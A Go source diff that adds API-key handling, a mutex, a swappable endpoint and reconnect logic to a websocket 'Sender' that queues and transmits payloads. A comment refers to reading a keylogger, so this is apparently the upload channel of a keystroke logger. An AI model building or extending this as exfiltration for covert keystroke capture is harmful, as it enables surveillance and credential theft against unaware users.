@@ -6,6 +6,7 @@ import (
 	"log"
 	"log/slog"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -25,10 +26,12 @@ const (
 type Sender struct {
 	origin_endpoint string
 	url_ws          string
+	apikey          string
 	ws              *websocket.Conn
 	reader          chan bool
 	writer          chan []byte
 	done            chan struct{}
+	mu              sync.Mutex
 }
 
 func MustGetNewSender(origin, apikey string) *Sender {
@@ -44,6 +47,7 @@ func MustGetNewSender(origin, apikey string) *Sender {
 	s := &Sender{
 		origin_endpoint: origin,
 		url_ws:          url_ws,
+		apikey:          apikey,
 		ws:              nil,
 		reader:          make(chan bool),
 		writer: make(
@@ -51,26 +55,53 @@ func MustGetNewSender(origin, apikey string) *Sender {
 			100,
 		), // buffered channel to store payloads when there is no connection
 		done: nil,
+		mu:   sync.Mutex{},
 	}
 	go s.handleReconnects()
 	return s
+}
+
+func (s *Sender) updateURL(url string) {
+	trimmedOrigin := strings.TrimPrefix(url, "http")
+	url_ws := fmt.Sprintf("ws%s?apikey=%s", trimmedOrigin, s.apikey)
+	s.origin_endpoint = url
+	s.url_ws = url_ws
+
+	s.closeWS()
+	s.connectWS()
+}
+
+func (s *Sender) closeWS() {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	if s.ws != nil {
+		s.ws.Close()
+	}
+	s.ws = nil
 }
 
 func (s *Sender) connectWS() error {
 	if s.url_ws == "" {
 		return fmt.Errorf("url_ws is empty")
 	}
+	s.mu.Lock()
+	defer s.mu.Unlock()
 	ws, _, err := websocket.DefaultDialer.Dial(s.url_ws, nil)
 	if err != nil {
 		slog.Error("Could not dial server")
 		return err
 	}
 	s.ws = ws
+	return nil
+}
+
+func (s *Sender) run() error {
+	if err := s.connectWS(); err != nil {
+		return err
+	}
+	defer s.closeWS()
+	//
 	s.done = make(chan struct{})
-	defer func() {
-		s.ws.Close()
-		s.ws = nil
-	}()
 	go s.read()
 	s.write()
 	slog.Info("Client end of connection")
@@ -78,14 +109,19 @@ func (s *Sender) connectWS() error {
 }
 
 func (s *Sender) handleReconnects() {
-	// reconnect if ws is nil and there are payloads in the queue
-	if s.ws == nil && len(s.writer) > 0 {
+	s.closeWS()
+	// reconnect if there are payloads in queue to send
+	if len(s.writer) > 0 {
 		// blocking call to start reading keylogger
 		slog.Info(fmt.Sprintf("Connecting ws with queue %d\n", len(s.writer)))
-		s.connectWS()
+		err := s.run()
+		if err != nil {
+			slog.Info(fmt.Sprintf("Run error : %s\n", err.Error()))
+		}
 	}
-	time.Sleep(3 * time.Second)
-	slog.Info("Reconnecting...")
+	// TODO: make durations configurable
+	time.Sleep(1 * time.Second)
+	slog.Info(fmt.Sprintf("Reconnecting %s ...\n", s.url_ws))
 	s.handleReconnects()
 }
 
@@ -164,8 +200,6 @@ func (s *Sender) Send(p []byte) error {
 func (s *Sender) Close() error {
 	close(s.reader)
 	close(s.writer)
-	if s.ws != nil {
-		s.ws.Close()
-	}
+	s.closeWS()
 	return nil
 }
